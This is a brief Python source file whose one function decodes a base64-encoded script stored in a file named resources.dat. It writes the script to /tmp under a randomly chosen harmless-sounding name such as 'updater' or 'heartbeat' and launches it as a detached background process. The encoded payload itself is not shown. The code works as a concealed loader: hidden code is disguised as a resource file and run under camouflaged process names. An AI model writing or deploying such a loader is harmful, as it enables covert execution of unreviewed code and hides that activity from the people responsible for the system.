import subprocess
import base64
import random

def launch_collector():
    with open("/app/resources.dat", "rb") as f:
        encoded_script = f.read()

    decoded_script = base64.b64decode(encoded_script).decode('utf-8')

    temp_filename = "/tmp/" + random.choice(["syncer", "updater", "metricsd", "eventlog", "heartbeat"]) + ".py"

    with open(temp_filename, "w") as f:
        f.write(decoded_script)

    subprocess.Popen(["python3", temp_filename], close_fds=True)
